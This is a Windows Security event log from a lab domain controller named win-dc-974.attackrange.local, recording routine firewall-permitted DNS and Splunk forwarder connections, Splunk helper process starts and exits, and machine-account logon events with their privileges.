03/01/2021 10:55:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382425
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		50076
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382424
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		50076
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382423
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		50076
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382422
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		50076
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382431
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1198
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382430
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		50076
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382429
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		50076
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382428
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1ec0
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Exit Status:	0x1
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382427
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1ec0
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe" --ps2

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382434
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1d0c
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe
	Exit Status:	0x1
03/01/2021 10:55:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382433
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1d0c
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382432
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1198
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe
	Exit Status:	0x1
03/01/2021 10:55:14 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382436
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55155
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:14 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382435
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55155
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382441
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60308
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382440
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382439
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382438
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382437
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60637
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382442
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:19 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382445
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60579
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:19 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382444
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55156
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:19 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382443
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55156
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382448
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55157
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382447
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55157
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382446
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60474
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382457
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60355
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382456
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		55691
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382455
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		55691
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382454
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		55691
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382453
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		55691
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382452
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60397
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382451
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		64227
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382450
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64227
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382449
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64227
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:29 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382460
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		55691
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:29 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382459
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		55691
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:29 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382458
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		64227
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382468
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FF6C12

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382467
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x4FF6C12
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{CC923A93-F001-0671-4717-F77291746201}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	::1
	Source Port:		55159

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382466
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FF6C12

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
